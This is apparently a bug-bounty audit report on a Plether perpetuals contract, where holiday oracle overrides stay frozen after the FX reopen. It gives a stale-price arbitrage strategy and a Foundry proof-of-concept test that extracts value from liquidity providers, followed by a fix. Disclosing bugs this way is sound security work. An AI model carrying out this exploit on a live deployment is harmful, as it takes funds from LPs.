# \#99819 [SC-Medium] Holiday override stays frozen after the FX reopen, letting traders and LPs exit at stale prices at LP expense

**Submitted on Nov 15th 2026 at 12:15:32 UTC by @slowpoke for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99819
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

Brief / Intro

Holiday overrides are stored as whole UTC days, so MarketCalendarLib.marketStatus keeps the oracle frozen from 00:00 to 24:00 UTC. FX and Pyth reopen at 17:00 New York, which is 21:00 UTC in daylight time and 22:00 UTC in standard time. For the last 2–3 h of every non-Friday override, live prices exist but the protocol still uses the pre-holiday mark. Traders can close at that stale mark in a single block, and LPs can redeem at stale NAV.

An attacker who opens a balanced LONG + SHORT book before the override gets a free option on the holiday gap:

close the losing leg at the stale mark during the tail;
close the winning leg at the live price after 00:00 UTC.

LPs pay the gap. The PoC shows +$4,236.65 for the attacker and −$4,119.11 for the LPs who stay. Without the tail, the same trade nets −$561.76, which is just costs.

Vulnerability details

1. The override ignores the 17:00 New York reopen. MarketCalendarLib.sol L51–53:

solidity
if (todayOverride) {
    return (true, true); // frozen for the full UTC day
}

The weekend branches use newYorkMarketBoundary; the override branch does not.

2. Frozen execution uses the cached mark. PletherOracle._resolveOrderExecutionBasket (L582–594) returns _frozenBasket(), which is engine.lastMarkPrice(), and ignores supplied Pyth data. Frozen closes also skip the confidence penalty (L937). The only cost is the 50 bps spread plus the 4 bps fee.

3. The tail can't be cut short. _resolveCurrentBasket (L749–756) also replays the frozen basket. updateMarkPrice with a fresh Pyth payload therefore leaves the mark unchanged until 24:00 UTC.

4. Same-block execution is allowed. OrderRouterExecutionSidecar.sol L447–452 skips the SameBlock and publishTime <= commitTime checks while frozen.

5. LP settlement runs at stale NAV. HousePool.settleLpEpoch L809 skips the Router-only and mark-freshness checks while frozen (hasOpenPositions && !oracleFrozen). Anyone can then settle redemptions at the old NAV. The only charge is the frozen LP fee: 25 bps Senior, 75 bps Junior.

Not the known limitation. SECURITY.md documents UTC-day overrides and the fixed spread as design choices (L1334, L1338). It also limits frozen mode to "once feeds are genuinely offline" (L824). Staying frozen after feeds return contradicts that, and no governance setting avoids it.

Impact details
Trader: costs are about 66 bps of position size. Any reopen gap above that is profit taken from LPs. It scales with size, up to pool capacity, and the hedged book carries no directional risk.
LP: LPs who see the move can exit at stale NAV, which shifts the loss onto the LPs who stay.
Recurrence: every Monday–Thursday override, for 3 h in daylight time and 2 h in standard time. Friday overrides are not affected.
PoC ($320k per leg, 2% gap)	Attacker net	Staying LP
Override tail (bug)	+$4,236.65	−$4,119.11
Live after reopen (fixed)	−$561.76	—

Fix: end override days at the 17:00 New York boundary, or store overrides as [start, end) timestamps.

References
packages/perps/src/libraries/MarketCalendarLib.sol L51–53
packages/perps/src/PletherOracle.sol L582–594, L749–756, L937
packages/perps/src/OrderRouterExecutionSidecar.sol L447–452
packages/perps/src/HousePool.sol L809, L1148–1155
packages/perps/SECURITY.md L824, L1334, L1338

## Proof of Concept

// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";

import {MockSettlementToken} from "../../../utils/MockSettlementToken.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice F-1 PoC: a UTC-day holiday override keeps the oracle frozen for ~3 h after the 17:00 New York FX reopen.
///         During that tail, a trader can close at the stale pre-holiday mark while live FX prices already exist.
///         Run: forge test --match-contract F1OverrideTailPoC -vv
contract F1OverrideTailPoC is BasePerpTest {

    MockPyth mockPyth;

    bytes32 constant FEED_A = bytes32(uint256(1));
    bytes32 constant FEED_B = bytes32(uint256(2));

    address lp = address(0xB0B);
    address attackerLong = address(0xA11CE); // leg A
    address attackerShort = address(0xCA201); // leg B
    address stranger = address(0x5157);
    address exitingLp = address(0x1EAF);

    bytes32[] feedIds;
    uint256[] weights;
    uint256[] bases;

    // US DST is active (began Sun 2026-03-08), so 17:00 New York = 21:00 UTC.
    uint256 constant TUE_OPEN = 1_773_144_000; // Tue 2026-03-10 12:00 UTC (live)
    uint256 constant TUE_LAST_MARK = 1_773_172_800; // Tue 2026-03-10 20:00 UTC (last live mark before the holiday)
    uint256 constant WED_DAY_START = 1_773_187_200; // Wed 2026-03-11 00:00 UTC (override day D)
    uint256 constant WED_NY_REOPEN = 1_773_262_800; // Wed 2026-03-11 21:00 UTC = 17:00 New York: FX reopens
    uint256 constant WED_TAIL = 1_773_264_600; // Wed 2026-03-11 21:30 UTC: FX live, protocol still frozen
    uint256 constant THU_START = 1_773_273_600; // Thu 2026-03-12 00:00 UTC: override ends

    int64 constant PRE_HOLIDAY_PRICE = 80_000_000; // 0.80000000
    int64 constant REOPEN_PRICE = 78_400_000; // 0.78400000 (-2.0% gap at the reopen)

    uint256 constant SIZE = 400_000e18; // 400k units -> $320k notional per leg
    uint256 constant MARGIN = 20_000e6;
    uint256 constant DEPOSIT = 40_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.0005e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 100,
            initMarginBps: 150,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        settlementToken = new MockSettlementToken();
        mockPyth = new MockPyth();
        mockPyth.setSynchronizeLegacyUniquePrices(true);

        clearinghouse = new MarginClearinghouse(address(settlementToken));
        engine = _deployEngine(_riskParams());
        _syncEngineAdmin();
        engine.setTerminalNavBook(address(new TerminalNavBookV2(address(engine), uint32(engine.CAP_PRICE()))));
        pool = new HousePool(address(settlementToken), address(engine), address(new HousePoolRedemptionMathSidecar()));
        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Plether Senior LP", "seniorAssets", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Plether Junior LP", "juniorAssets", 0, address(0)
        );
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));

        feedIds.push(FEED_A);
        feedIds.push(FEED_B);
        weights.push(0.5e18);
        weights.push(0.5e18);
        bases.push(1e8);
        bases.push(1e8);

        engineLens = new CfdEngineLens(address(engine));
        pletherOracle =
            new PletherOracle(address(engine), address(pool), address(mockPyth), feedIds, weights, bases, new bool[](2));
        router = _deployLegacyOrderRouter(address(engine), address(engineLens), address(pool), address(pletherOracle));
        _syncRouterAdmin();
        engine.setOrderRouter(address(router));

        _bypassAllTimelocks();
        _bootstrapSeededLifecycle();
        _fundJunior(lp, 1_000_000e6);
        _fundJunior(exitingLp, 100_000e6);

        _fundAccount(attackerLong);
        _fundAccount(attackerShort);
    }

    // ---------------------------------------------------------------- helpers

    function _fundAccount(
        address who
    ) internal {
        settlementToken.mint(who, DEPOSIT);
        vm.startPrank(who);
        settlementToken.approve(address(clearinghouse), type(uint256).max);
        clearinghouse.deposit(who, DEPOSIT);
        vm.stopPrank();
        vm.deal(who, 1 ether);
    }

    function _empty() internal pure returns (bytes[] memory d) {
        d = new bytes[](1);
        d[0] = "";
    }

    function _livePayload(
        int64 price,
        uint64 tick,
        uint64 previous
    ) internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(feedIds[i], MockPyth.MockPrice(price, 0, -8, tick, previous));
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    /// @dev Live (non-frozen) commit -> execute with a tick published after the commit, next block.
    function _liveOrder(
        address who,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        int64 price,
        uint256 at
    ) internal returns (uint64 id) {
        vm.warp(at);
        vm.prank(who);
        id = router.commitOrder(side, size, margin, 0, isClose);
        mockPyth.setAllPrices(feedIds, price, int32(-8), at + 6);
        vm.warp(at + 50);
        vm.roll(block.number + 1);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(id, _empty());
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "live order not executed");
    }

    /// @dev Opens the attacker's balanced book on Tuesday and installs the last live pre-holiday mark.
    function _openHedgedBookAndInstallLastMark() internal {
        _liveOrder(attackerLong, CfdTypes.Side.LONG, SIZE, MARGIN, false, PRE_HOLIDAY_PRICE, TUE_OPEN);
        _liveOrder(attackerShort, CfdTypes.Side.SHORT, SIZE, MARGIN, false, PRE_HOLIDAY_PRICE, TUE_OPEN + 600);

        vm.warp(TUE_LAST_MARK);
        mockPyth.setAllPrices(feedIds, PRE_HOLIDAY_PRICE, int32(-8), TUE_LAST_MARK);
        router.updateMarkPrice(_livePayload(PRE_HOLIDAY_PRICE, uint64(TUE_LAST_MARK), uint64(TUE_OPEN + 606)));
        assertEq(engine.lastMarkPrice(), uint256(uint64(PRE_HOLIDAY_PRICE)), "last live mark");
    }

    function _setOverrideDay(
        uint256 dayTimestamp
    ) internal {
        uint256[] memory days_ = new uint256[](1);
        days_[0] = dayTimestamp;
        ICfdEngineAdminHost.EngineCalendarConfig memory config = _engineCalendarConfig();
        config.fadDayTimestamps = days_;
        _setCalendarConfig(config);
    }

    function _netAttackerPnl() internal view returns (int256) {
        uint256 endBalance = _settlementBalance(attackerLong) + _settlementBalance(attackerShort)
            + engine.traderClaimBalanceAssets(attackerLong) + engine.traderClaimBalanceAssets(attackerShort);
        return int256(endBalance) - int256(2 * DEPOSIT);
    }

    /// @dev Value of the remaining (non-exiting) junior LP's shares at the vault's current share price.
    function _stayingLpValue() internal view returns (uint256) {
        return juniorVault.balanceOf(lp) * juniorVault.totalAssets() / juniorVault.totalSupply();
    }

    function _positionSize(
        address who
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(who);
    }

    // ---------------------------------------------------------------- PoC

    /// Holiday override on Wednesday D. FX reopens at 21:00 UTC with a -2% basket gap. The protocol stays frozen
    /// until 24:00 UTC. The attacker closes the losing SHORT leg at the stale 0.80 mark in the same block it was
    /// committed, then closes the winning LONG leg at the live 0.784 price after midnight. LPs pay the difference.
    function test_F1_OverrideTail_HedgedHolidayOption_ExtractsFromLps() public {
        // Governance configures a normal holiday override for Wednesday D (72 h timelock bypassed in tests).
        _setOverrideDay(WED_DAY_START + 12 hours);
        _openHedgedBookAndInstallLastMark();

        uint256 stayingLpBefore = _stayingLpValue();

        // --- Tail window: FX has reopened and Pyth publishes the new price, but the protocol is still frozen.
        vm.warp(WED_TAIL);
        assertGt(block.timestamp, WED_NY_REOPEN, "after 17:00 New York reopen");
        assertTrue(engine.isOracleFrozen(), "protocol still frozen after FX reopened");
        mockPyth.setAllPrices(feedIds, REOPEN_PRICE, int32(-8), WED_TAIL);

        // (1) The live reopen price cannot be installed: frozen replay ignores the supplied Pyth data.
        router.updateMarkPrice(_livePayload(REOPEN_PRICE, uint64(WED_TAIL), uint64(TUE_LAST_MARK)));
        assertEq(engine.lastMarkPrice(), uint256(uint64(PRE_HOLIDAY_PRICE)), "mark stays at stale pre-holiday price");
        assertEq(engine.lastMarkTime(), TUE_LAST_MARK, "mark time unchanged");

        // (2) The basket fell, so SHORT is the losing leg (LONG profits when the basket falls, CfdTypes.Side).
        //     It is committed and executed in the SAME block at the stale mark (SameBlock/MevBoundary skipped,
        //     the supplied live Pyth payload is ignored).
        vm.prank(attackerShort);
        uint64 closeShort = router.commitOrder(CfdTypes.Side.SHORT, SIZE, 0, 0, true);
        OrderV3Types.ExecutionResult memory r =
            router.executeOrder(closeShort, _livePayload(REOPEN_PRICE, uint64(WED_TAIL), uint64(TUE_LAST_MARK)));
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "same-block frozen close executed");
        assertEq(_positionSize(attackerShort), 0, "losing short leg closed at the stale mark");

        // (3) LP side: a junior LP requests redemption during the tail (before the 21:55 cutoff). At the 22:00 UTC
        //     epoch anyone can settle it at the cached pre-holiday NAV: the Router-only and post-boundary mark checks
        //     are skipped because the oracle is "frozen", even though positions are open and FX is trading.
        uint256 lpShares = juniorVault.balanceOf(exitingLp);
        vm.prank(exitingLp);
        uint256 redeemId = juniorVault.requestRedeem(lpShares, exitingLp, exitingLp);
        vm.warp(pool.lpEpochStart(redeemId)); // 22:00 UTC, still frozen
        assertTrue(engine.isOracleFrozen(), "still frozen at the 22:00 LP epoch");
        assertTrue(engine.terminalNavSnapshot().hasOpenPositions, "positions are open");
        assertLt(engine.lastMarkTime() / pool.LP_EPOCH_DURATION(), block.timestamp / pool.LP_EPOCH_DURATION(),
            "mark predates the epoch (live path would revert HousePool__MarkPriceStale)");
        vm.prank(stranger);
        pool.settleLpEpoch(0, 0);
        uint256 claimableShares = juniorVault.claimableRedeemRequest(redeemId, exitingLp);
        assertEq(claimableShares, lpShares, "redemption funded at stale NAV during the tail");
        vm.prank(exitingLp);
        uint256 lpExitAssets = juniorVault.claimRedeem(redeemId, claimableShares, exitingLp, exitingLp);

        // --- After 00:00 UTC the override ends; the winning LONG leg closes at the live reopen price.
        _liveOrder(attackerLong, CfdTypes.Side.LONG, SIZE, 0, true, REOPEN_PRICE, THU_START + 30);
        assertEq(_positionSize(attackerLong), 0, "winning long leg closed live");

        int256 attackerNet = _netAttackerPnl();
        int256 stayingLpDelta = int256(_stayingLpValue()) - int256(stayingLpBefore);

        emit log_named_decimal_int("attacker net PnL (USDC)", attackerNet, 6);
        emit log_named_decimal_int("staying junior LP value change (USDC)", stayingLpDelta, 6);
        emit log_named_decimal_uint("exiting LP paid at stale NAV (USDC, of 100k)", lpExitAssets, 6);

        // Gap value = 2% x $320k = $6,400; costs ~ 50 bps frozen spread + 4 x 4 bps fees + VPI + carry.
        assertGt(attackerNet, 3_500e6, "attacker extracts > $3,500 net from a $320k-per-leg hedged book");
        assertLt(stayingLpDelta, 0, "remaining junior LPs lose value");
    }

    /// Control: identical book and identical -2% reopen gap, but the override ends at the 17:00 New York boundary
    /// (modelled here as no override on D, which is what the recommended fix produces after 21:00 UTC).
    /// The losing leg now closes at the live price, and the attacker's net is just the cost of the round trip.
    function test_F1_Control_LiveAfterReopen_NoExtraction() public {
        _openHedgedBookAndInstallLastMark();

        vm.warp(WED_TAIL);
        assertFalse(engine.isOracleFrozen(), "control: protocol live after the reopen");

        _liveOrder(attackerShort, CfdTypes.Side.SHORT, SIZE, 0, true, REOPEN_PRICE, WED_TAIL);
        _liveOrder(attackerLong, CfdTypes.Side.LONG, SIZE, 0, true, REOPEN_PRICE, THU_START + 30);

        int256 attackerNet = _netAttackerPnl();
        emit log_named_decimal_int("control attacker net PnL (USDC)", attackerNet, 6);
        assertLt(attackerNet, 0, "control: hedged book only pays costs");
    }
}

